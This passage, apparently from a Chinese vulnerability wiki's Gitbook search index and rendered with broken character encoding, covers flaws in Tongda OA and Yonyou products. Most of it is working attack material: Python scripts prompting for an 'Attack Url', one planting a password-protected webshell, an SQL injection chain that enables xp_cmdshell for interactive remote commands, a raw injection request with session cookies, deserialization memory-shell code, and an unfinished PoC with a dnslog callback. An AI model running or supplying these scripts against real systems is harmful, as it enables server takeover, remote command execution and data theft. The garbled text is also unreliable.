\"Ê°£Ê°àÂ∑≤‰øùÂ≠ò\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} ÊàêÂäü‰∏ä‰º† peiqi.log Êñá‰ª∂, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏ä‰º† peiqi.log Êñá‰ª∂Â§±Ë¥•\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033[0m\".format(target_url)) if \"PeiQi_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥ûÔºåÂìçÂ∫î‰∏≠ÂåÖÂê´ PeiQi_Wiki \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÊàêÂäü‰∏ä‰º†ËöÅÂâëÊú®È©¨ ÂØÜÁ†Å‰∏∫: PeiQi \\n[o] webshellË∑ØÂæÑ: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÊºèÊ¥ûÔºåÂìçÂ∫î‰∏≠‰∏çÂåÖÂê´ PeiQi_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"PHPSESSID=ug4ip8ohugo61bmu399npplep5; USER_NAME_COOKIE=admin; OA_USER_ID=admin\" POC_1(target_url, Cookie) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.9 ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.9 ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"ÈÄöËææOA v11.9 ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"ÈÄöËææOA v11.9 ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈÄöËææOA v11.9 Âèä‰ª•‰∏ãÁâàÊú¨‰∏≠Áî±‰∫éÊüê‰∫õÂèÇÊï∞ËøáÊª§‰∏çÂÆåÂñÑÂØºËá¥ÂêéÂè∞Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈÄöËææOA ÁéØÂ¢ÉÊê≠Âª∫ https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe ÂèåÂáªÂÆâË£Ö ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÊñá‰ª∂‰Ωç webroot/general/appbuilder/modules/portal/controllers/WorkbenchController.php public function actionUpsharestatus() { Yii::$app->response->format = yii\\web\\Response::FORMAT_JSON; $data = modules\\appdesign\\models\\AppUtils::toGBK($_POST); if (modules\\portal\\controllers\\intval($data[\"uid\"]) == $_SESSION[\"LOGIN_UID\"]) { modules\\portal\\models\\PortalWorkbench::updateAll(array(\"state\" => \"{$data[\"status\"]}\"), \"id={$data[\"id\"]}\"); } else if ($data[\"status\"] == 1) { modules\\portal\\models\\PortalWorkbenchState::deleteAll(array(\"wids\" => \"{$data[\"id\"]}\", \"uid\" => \"{$_SESSION[\"LOGIN_UID\"]}\")); } else { $Work = new modules\\portal\\models\\PortalWorkbenchState(); $Work->wids = $data[\"id\"]; $Work->uid = $_SESSION[\"LOGIN_UID\"]; $Work->save(); } $dataBack = array(\"status\" => 1, \"msg\" => modules\\portal\\controllers\\_(\"Êìç‰ΩúÊàêÂäü\")); $dataBack = modules\\appdesign\\models\\AppUtils::toUTF8($dataBack); return $dataBack; } ÂÖ∂‰∏≠ updateAll() ÂáΩÊï∞Âπ∂Ê≤°Êúâ‰ΩøÁî®Èò≤Ê≠¢ SQLÊ≥®ÂÖ•ÁöÑ sql_injection() Êù•Èò≤Ê≠¢Ê≥®ÂÖ• webroot/inc/conn.php ÊâÄ‰ª•ËøôÈáåÂ∞±Âá∫Áé∞‰∫Ü id ÂèÇÊï∞Â≠òÂú®Ê≥®ÂÖ•ÁöÑÊÉÖÂÜµÔºåËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1 Host: oa.tongda2000.com Connection: close Content-Length: 36 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Origin: https://oa.tongda2000.com Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://oa.tongda2000.com/general/appbuilder/web/portal/workbench/upsharestatus Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: __root_domain_v=.tongda2000.com; SID_12=5ea03399; USER_NAME_COOKIE=chenqiang; Hm_lvt_7cbefde9059536a2b96aaafc134d625c=1617014067,1617196083; _qddaz=QD.677915359373668; PHPSESSID=nso4iqhvp2qi464eoavk2fn0c0; OA_USER_ID=chenqiang; SID_15=ded66d80; LAST_OPERATION_TIME=1617242241 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 uid=15&status=1&id=1;select sleep(4) Ê≥®ÊÑè uidÂèÇÊï∞ Ë¶Å‰∏∫ÂΩìÂâçÁî®Êà∑ÁöÑuidÊâçËÉΩÂÆåÊàêËØ∑Ê±ÇÔºåÂèØ‰ª•‰ΩøÁî® burp ÈÅçÂéÜÊü•ÁúãÊó∂Èó¥ÂìçÂ∫î ‰æãÂ¶ÇËøôÈáå‰ΩøÁî®ÂÆòÁΩëÁöÑÊµãËØïË¥¶Êà∑ uid ÈÅçÂéÜÂá∫‰∏∫ 15 Â¶ÇÊûúuidÈîôËØØÂàô‰∏ç‰ºöÂá∫Áé∞Êó∂Èó¥Âª∂ËøüÔºåÂ∞ÜËØ∑Ê±ÇÂåÖÊîæÂÖ• SqlmapË∑ë‰∏Ä‰∏ã Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/","title":"Áî®ÂèãOA","keywords":"","body":"Áî®Âèã Áî®ÂèãGRP-U8Ë°åÊîø‰∫ã‰∏öË¥¢Âä°ÁÆ°ÁêÜËΩØ‰ª∂ SQLÊ≥®ÂÖ• CNNVD-201610-923 Áî®Âèã NC bsh.servlet.BshServlet ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Áî®Âèã NC ÂèçÂ∫èÂàóÂåñRCEÊºèÊ¥û Áî®Âèã NC XbrlPersistenceServletÂèçÂ∫èÂàóÂåñ Áî®Âèã U8 OA test.jsp SQLÊ≥®ÂÖ•ÊºèÊ¥û Áî®ÂèãERP-NC ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®ÂèãGRP-U8Ë°åÊîø‰∫ã‰∏öË¥¢Âä°ÁÆ°ÁêÜËΩØ‰ª∂ SQLÊ≥®ÂÖ• CNNVD-201610-923.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®ÂèãGRP-U8Ë°åÊîø‰∫ã‰∏öË¥¢Âä°ÁÆ°ÁêÜËΩØ‰ª∂ SQLÊ≥®ÂÖ• CNNVD-201610-923.html","title":"Áî®ÂèãGRP-U8Ë°åÊîø‰∫ã‰∏öË¥¢Âä°ÁÆ°ÁêÜËΩØ‰ª∂ SQLÊ≥®ÂÖ• CNNVD-201610-923","keywords":"","body":"Áî®ÂèãGRP-U8Ë°åÊîø‰∫ã‰∏öË¥¢Âä°ÁÆ°ÁêÜËΩØ‰ª∂ SQLÊ≥®ÂÖ• CNNVD-201610-923 ÊºèÊ¥ûÊèèËø∞ Áî®ÂèãGRP-u8Â≠òÂú®XXEÊºèÊ¥ûÔºåËØ•ÊºèÊ¥ûÊ∫ê‰∫éÂ∫îÁî®Á®ãÂ∫èËß£ÊûêXMLËæìÂÖ•Êó∂Ê≤°ÊúâËøõÂà∂Â§ñÈÉ®ÂÆû‰ΩìÁöÑÂä†ËΩΩÔºåÂØºËá¥ÂèØÂä†ËΩΩÂ§ñÈÉ®SQLËØ≠Âè•Ôºå‰ª•ÂèäÂëΩ‰ª§ÊâßË°å ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Áî®ÂèãGRP-U8Ë°åÊîø‰∫ã‰∏öÂÜÖÊéßÁÆ°ÁêÜËΩØ‰ª∂ÔºàÊñ∞ÊîøÂ∫ú‰ºöËÆ°Âà∂Â∫¶‰∏ìÁâàÔºâ FOFA [!NOTE] title=\"Áî®ÂèãGRP-U8Ë°åÊîø‰∫ã‰∏öÂÜÖÊéßÁÆ°ÁêÜËΩØ‰ª∂\" ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÂà©Áî®POCËØ∑Ê±ÇÂåÖ POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=XML AS_DataRequest ProviderNameDataSetProviderData Dataselect @@version ËØ∑Ê±ÇÂêéÊåâF12Êü•ÁúãÊ∫ê‰ª£Á†ÅÂèØ‰ª•ÂæóÂà∞SQLËØ≠Âè•Êü•ËØ¢ÁªìÊûú ‰πüÂèØ‰ª•Ë∞ÉÁî® xp_cmdshell Êù•ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§(Â§ßÈÉ®ÂàÜÊ≠§Á≥ªÁªü‰∏∫windows) [!NOTE] Ê≥®ÊÑèÔºöÂ§ßÈÉ®ÂàÜÈªòËÆ§ÊòØ‰∏çÂºÄÂêØ xp_cmdshell Ê®°ÂùóÁöÑ ÂèØ‰ª•‰ΩøÁî®Â¶Ç‰∏ãÊñπÊ≥ïÊâìÂºÄxp_cmdshellÊñπÊ≥ï Â∞ÜÂ¶Ç‰∏ãPOSTÊï∞ÊçÆÊåâÈ°∫Â∫èÂèëÈÄÅ(Ê≥®ÊÑè master Êîπ‰∏∫ÂΩìÂâçÊï∞ÊçÆÂ∫ìÂêç) cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatause master cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec sp_configure 'show advanced options',1 cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatareconfigure cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec sp_configure 'xp_cmdshell',1 cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatareconfigure [!NOTE] ÂèëÈÄÅÂ¶Ç‰∏äÂÆûÈôÖ‰∏∫ÊâßË°åSQLËØ≠Âè•ÊâìÂºÄ xp_cmdshell use master; exec sp_configure 'show advanced options',1; reconfigure; exec sp_configure 'xp_cmdshell',1; reconfigure; ÂÜçÂèëÈÄÅ‰ª•‰∏ãÊï∞ÊçÆÂèØÊàêÂäü‰ΩøÁî®(‰πüÂèØËÉΩÂ§±Ë¥•) cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"whoami\" [!NOTE] ÊâßË°åËøáÁ®ã‰∏≠Êä•Èîô java.sql.SQLException„ÄêÈîôËØØ‰ª£Á†Å: 0; Áõ∏ÂÖ≥‰ø°ÊÅØ:xxxxxx„Äë‰∏çÁî®ÁêÜ‰ºö ÂèëÈÄÅËØ∑Ê±ÇÂêéÂÜç‰ΩøÁî®Ê≠§Ê®°ÂùóÂàô‰ºöÊàêÂäüËØ∑Ê±ÇÊâßË°åÁ≥ªÁªüÂëΩ‰ª§ ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Áî®ÂèãGRP-U8Ë°åÊîø‰∫ã‰∏öÂÜÖÊéßÁÆ°ÁêÜËΩØ‰ª∂ \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 CNNVD-201610-923.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36m(Y/N) >>> Y or N \\033[0m') print('+ \\033[36mcmd >>> ipconfig \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataselect 1,user,db_name(),host_name(),@@version\"\"\" try: print(\"\\033[32m[o] Ê≠£Âú®ÊâßË°åSQLËØ≠Âè•:select 1,user,db_name(),host_name(),@@version...\\033[0m\") response = requests.post(url=check_url, headers=headers, data=data, timeout=10) row_1 = '> Êï∞ÊçÆÂ∫ìÁî®Êà∑‰∏∫:{}\\033[0m\".format(db_user)) print(\"\\033[32m >> Êï∞ÊçÆÂ∫ìÂêç‰∏∫:{}\\033[0m\".format(db_name)) print(\"\\033[32m >> Êï∞ÊçÆÂ∫ì‰∏ªÊú∫Âêç‰∏∫:{}\\033[0m\".format(db_host)) print(\"\\033[32m >> Êï∞ÊçÆÂ∫ìÁâàÊú¨‰∏∫:{}\\033[0m\".format(db_vers)) return db_name else: print(\"\\033[31m[x] ÊºèÊ¥ûÂ∑≤Ë¢´‰øÆÂ§ç \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) def xp_cmdshell_open(target_url, db_name): open_sql = [\"use {}\".format(db_name),\"exec sp_configure 'show advanced options',1\",\"reconfigure\",\"exec sp_configure 'xp_cmdshell',1\",\"reconfigure\"] num = 1 for sql in open_sql: open_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataData{}'.format(sql) try: print(\"\\033[32m[o] Ê≠£Âú®ÊâßË°åSQLËØ≠Âè•:{}...\\033[0m\".format(sql)) response = requests.post(url=open_url, headers=headers, data=data, timeout=10) num = num + 1 if num == 5 : POC_2(target_url, db_name) except: print(\"\\033[31m[x] ÂºÄÂêØ xp_cmdsheall Â§±Ë¥• \\033[0m\") sys.exit(0) def POC_2(target_url, db_name): db_name = db_name sql_cmd_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"whoami\"\"\"\" try: print(\"\\033[32m[o] Ê≠£Âú®ÊâßË°åSQLËØ≠Âè•:exec xp_cmdshell 'whoami'...\\033[0m\") response = requests.post(url=sql_cmd_url, headers=headers, data=data, timeout=10) if 'exec xp_cmdshell' in response.text: print(\"\\033[31m[x] Êï∞ÊçÆÂ∫ìÊú™ÂºÄÂêØ xp_cmdshell Ê®°Âùó\\033[0m\") sqlcmd_open = str(input(\"\\033[35mÊòØÂê¶ÂºÄÂêØ xp_cmdshell\\n(Y/N) >>> \\033[0m\")) if sqlcmd_open == 'Y' or sqlcmd_open == 'y': xp_cmdshell_open(target_url, db_name) else: print(\"\\033[31m[x] ÂÅúÊ≠¢ÂºÄÂêØ xp_cmdshell \\033[0m\") sys.exit(0) else: whoami = re.findall(r'output=\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] ÊàêÂäüÊâßË°åSQLËØ≠Âè•:exec xp_cmdshell 'whoami'...\\n>>> {}\\033[0m\".format(whoami)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, cmd): vuln_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"{}\"'.format(cmd) try: print(\"\\033[32m[o] Ê≠£Âú®ÊâßË°åSQLËØ≠Âè•:exec xp_cmdshell '{}'...\\033[0m\".format(cmd)) response = requests.post(url=vuln_url, headers=headers, data=data, timeout=10) data = re.findall(r'output=\"(.*?)\"', response.text) for i in data: print(\"\\033[32m >>> {}\\033[0m\".format(i)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) db_name = POC_1(target_url) POC_2(target_url, db_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_3(target_url, cmd) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®Âèã NC ÂèçÂ∫èÂàóÂåñRCEÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®Âèã NC ÂèçÂ∫èÂàóÂåñRCEÊºèÊ¥û.html","title":"Áî®Âèã NC ÂèçÂ∫èÂàóÂåñRCEÊºèÊ¥û","keywords":"","body":"Áî®Âèã NC ÂèçÂ∫èÂàóÂåñRCEÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Áî®ÂèãNC Â≠òÂú®ÂèçÂ∫èÂàóÂåñ RCEÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØÂà©Áî®ÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Áî®Âèã NC ÊºèÊ¥ûÂ§çÁé∞ È¶ñÂÖà‰ªé‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ËØ¥Ëµ∑ ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÂàÜÊûê‰ª£Á†ÅÂú®servlet.FileReceiveServlet„ÄÇÂú®ËøôÈáåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Ôºå‰ªéËØ∑Ê±Ç‰∏≠ËØªÂèñÊµÅÔºåÁÑ∂ÂêéËΩ¨Êç¢‰∏∫mapÁ±ªÂûãÂπ∂ËØªÂèñ‰∏ä‰º†Êñá‰ª∂ÁöÑË∑ØÂæÑ„ÄÇÁÑ∂ÂêéÂÜçËØªÂèñÂæÖ‰∏ä‰º†ÁöÑÊñá‰ª∂„ÄÇ ËÄåÁΩë‰∏äÂæàÂ§öpocÔºåÂ§ßÂ§öÈÉΩÊòØÂü∫‰∫éÊ≠§ÊºèÊ¥ûÔºåÂà©Áî®ÂèçÂ∫èÂàóÂåñ‰∏ä‰º†‰∏Ä‰∏™Êñá‰ª∂Âà∞ÊúçÂä°Âô®„ÄÇ Ëøô‰πüÂ∞±ÊòØÂéªÂπ¥ÁöÑÈÇ£‰∏™‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ‰ΩÜÊòØÔºå‰ΩÜÊòØÔºåËøô‰∏™ÊºèÊ¥ûÊú¨Ë¥®ÊòØ‰∏Ä‰∏™ÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇËÄå‰∏îÊüêCÁöÑclasspath‰∏≠Ôºå‰πüÂ≠òÂú®apache commonscollectionsÂ∫ìÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ëøô‰∏™Â∫ìÔºåÁõ¥Êé•ÊâßË°åÂëΩ‰ª§ÊàñËÄÖÂÜÖÂ≠òÈ©¨„ÄÇÂ≤Ç‰∏çÊòØÊØî‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ËàíÊúçÂ§ö‰∫Ü„ÄÇ ÂÜÖÂ≠òÈ©¨ ËÄÅÊ†∑Â≠êÔºåÂú®ÂèçÂ∫èÂàóÂåñ‰∏≠ÊÉ≥ÊâßË°å‰ªªÊÑè‰ª£Á†ÅÔºå‰∏ÄËà¨ÈÉΩ‰æùÈù†xalanËøô‰∏™Â∫ì„ÄÇËøôÊ¨°‰πü‰∏ç‰æãÂ§ñ„ÄÇ Ê§çÂÖ•ÂÜÖÂ≠òÈ©¨ÔºåÂÖ≥ÈîÆÂú®‰∫éÊàë‰ª¨ÊÄéÊ†∑ÊâæÂà∞contextÔºåÂè™ÊúâÊâæÂà∞contextÔºåÊàë‰ª¨ÊâçÂèØ‰ª•Ê∑ªÂä†filter„ÄÇÂ•ΩÂú®Êüêc‰∏≠ÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÈÄöËøá‰∏ãÈù¢ÁöÑ‰ª£Á†ÅÊó¢ÂèØ‰ª•Ëé∑ÂèñÂΩìÂâçcontextÔºå‰∏çÈúÄË¶Å‰ªétomcat‰∏≠Ëé∑Âèñcontext Object obj = ÊîπÂä®Locator.getInstance().lookup(\"ServletContext\"); Field contextField = obj.getClass().getDeclaredField(\"context\"); contextField.setAccessible(true); obj = contextField.get(obj); Field contextField1 = obj.getClass().getDeclaredField(\"context\"); contextField1.setAccessible(true); addFitlertoTomcat(contextField1.get(obj)); Ââ©‰∏ãÁöÑÂ∞±ÊòØÂ∏∏ËßÑÊìç‰ΩúÔºåÂèØ‰ª•ÁúãÊàë‰πãÂâçÁöÑÂÜÖÂ≠òÈ©¨Ê®°ÂûãÔºåÂü∫Êú¨‰∏çÈúÄË¶ÅÂæàÂ§ßÁöÑÊîπÂä®Âç≥ÂèØÂÆåÁæéÈÄÇÈÖç„ÄÇ ÂõûÊòæ Êàë‰ª¨Âè™ÈúÄË¶ÅÊâæÂà∞ËøôÊ†∑‰∏Ä‰∏™servletÔºåÂç≥Â≠òÂú®ÂèçÂ∫èÂàóÂåñÁöÑreadObjectÔºåÂèàÂ∞ÜÈîôËØØ‰ø°ÊÅØÂÜôÂÖ•Âà∞response‰∏≠ ‰∏çÈöæÁúãÂá∫ uploadServlet Â∞±ÂæàÊª°Ë∂≥Ëøô‰∏™ÈúÄÊ±Ç„ÄÇ out = new ObjectOutputStream(output); in = new ObjectInputStream(request.getInputStream()); String dsName = (String)in.readObject(); } } catch (Exception var14) { var14.printStackTrace(); if (out == null) { throw new ServletException(var14); } out.writeObject(var14); Â¶ÇÊûúÂá∫ÈîôÁöÑËØùÔºåÂ∞ÜÈîôËØØ‰ø°ÊÅØÈÄöËøáÂ∫èÂàóÂåñÂÜôÂÖ•Âà∞response‰∏≠„ÄÇÂ•ΩÂ§ÑÂú®‰∫éÔºåÊàë‰ª¨‰∏çÈúÄË¶ÅÈ∫ªÁÉ¶ÁöÑÂéªÊâætomcatÁöÑresponseÂØπË±°„ÄÇ ÊâÄ‰ª•ÔºåÊàë‰ª¨Â∞ÜÂèçÂ∫èÂàóÂåñÁöÑpayloadÔºåÂèëÈÄÅÁªôuploadServletÂç≥ÂèØ„ÄÇÁÑ∂ÂêéÊàë‰ª¨Âè™ÈúÄË¶ÅËØªÂèñÂìçÂ∫îÔºåÂç≥ÂèØÊãøÂà∞ÊúçÂä°Âô®ÂëΩ‰ª§ÊâßË°åÁöÑÂõûÊòæÁªìÊûú„ÄÇÂÆ¢Êà∑Á´Ø‰ª£Á†ÅÂèØ‰ª•ËøôÊ†∑ÂÜô ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(r)); Exception e = (Exception) objectInputStream.readObject(); Object obj = e.getCause(); Field targetF = obj.getClass().getDeclaredField(\"target\"); targetF.setAccessible(true); obj = targetF.get(obj); Field msgF = obj.getClass().getSuperclass().getDeclaredField(\"detailMessage\"); msgF.setAccessible(true); String msg = msgF.get(obj).toString(); System.out.println(msg); ÂèÇËÄÉÊñáÁ´† https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®Âèã NC XbrlPersistenceServletÂèçÂ∫èÂàóÂåñ.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Áî®ÂèãOA/Áî®Âèã NC XbrlPersistenceServletÂèçÂ∫èÂàóÂåñ.html","title":"Áî®Âèã NC XbrlPersistenceServletÂèçÂ∫èÂàóÂåñ","keywords":"","body":"Áî®Âèã NC XbrlPersistenceServletÂèçÂ∫èÂàóÂåñ ÊºèÊ¥ûÊèèËø∞ Áî®Âèã NC XbrlPersistenceServletÂèçÂ∫èÂàóÂåñÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Áî®ÂèãNC ÊºèÊ¥ûÂ§çÁé∞ ÊîªÂáªÈòüÂà©Áî®Áî®ÂèãncÂèçÂ∫èÂàóÂà©Áî® ÁõÆÂâçÊµãËØïÂΩ±ÂìçÁâàÊú¨Ôºönc6.5 ÊºèÊ¥ûurl‰∏∫Ôºö /service/~xbrl/XbrlPersistenceServlet pocÔºö import requests import threadpool import urllib3 import sys import base64 ip = \"\" dnslog = \"\\x79\\x37\\x64\\x70\\\" #dnslogÊääÂ≠óÁ¨¶‰∏≤ËΩ¨16ËøõÂà∂ÊõøÊç¢ËØ•ÊÆµÔºåÊµãËØïÁî®ÁöÑceye.ioÂèØ‰ª•ÂõûÊòæ data = 